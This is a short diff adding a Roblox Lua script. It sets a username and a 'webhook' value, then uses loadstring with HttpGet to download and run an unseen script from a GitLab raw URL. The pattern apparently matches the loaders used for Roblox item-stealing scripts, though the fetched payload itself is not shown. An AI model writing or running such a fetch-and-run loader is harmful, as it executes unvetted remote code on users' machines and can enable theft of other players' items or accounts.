@@ -1,0 +1,4 @@
+Username = "SoledBYPudimmm"
+Webhook = "https://www.roblox.com/users/1570079386/profile"
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot"))()
